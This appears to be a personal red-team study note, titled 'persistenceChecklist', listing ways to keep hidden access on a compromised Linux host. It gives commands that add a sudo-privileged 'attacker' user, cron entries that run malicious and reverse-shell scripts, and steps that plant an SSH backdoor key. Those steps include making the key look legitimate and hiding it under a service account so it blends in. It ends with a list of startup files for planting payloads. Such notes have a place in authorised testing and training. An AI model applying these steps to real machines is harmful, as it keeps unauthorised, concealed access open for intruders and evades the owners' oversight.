---
title: "persistenceChecklist"
tags:
  - fetus
---
## add user:
```sh
sudo useradd attacker -G sudo  
sudo passwd attacker  
echo "attacker ALL=(ALL:ALL) ALL" | sudo tee -a /etc/sudoers
```
## cronjobs:
```sh
* * * * * root /path/to/malicious/script.sh
@reboot /path/to/malicious/script.sh
*/10 * * * * /bin/bash -c "/path/to/reverse_shell.sh"
```
## ssh key 
- do this on attacker machine:
```sh
ssh-keygen -t rsa -b 4096 -C "test@machineName" -f ~/.ssh/backdoor_key
```
- saves to ~/.ssh/id_rsa and ~/.ssh/id_rsa.pub by default if no -f flag
- used `-C` to add a comment blob at the end of the key to make it look legit
- will create 2 files, the secret key `id_rsa` and a public key `id_rsa.pub`. will login with the secret key and append the contents of the pubkey to the `authorized_keys` file on the victim
- transfer the pubkey and append content to `authorized_keys` in victim:
```sh
cat id_rsa.pub >> /home/victim/.ssh/authorized_keys

or

mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "PUBLIC_KEY_CONTENTS" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```
- add to a low privileged user/service like git instead to blend in for long term persistence for example at `/home/git/.ssh/authorized_keys`
- login :D 
```sh
ssh -i ~/.ssh/backdoor_key user@target
```
## add to startup/initialization scripts:
- list of such scripts:
```sh
# gotta look into this one more
etc/init.d
# bash
/etc/bash.bashrc
~/.bashrc
## shell initialization scripts
/etc/rc.d/*
/etc/rc.local
etc/systemd/system
usr/lib/systemd/user
usr/lib/systemd/system
# xdg autostart script 
/etc/xdg/autostart
# user logon script 
/etc/profile.d
```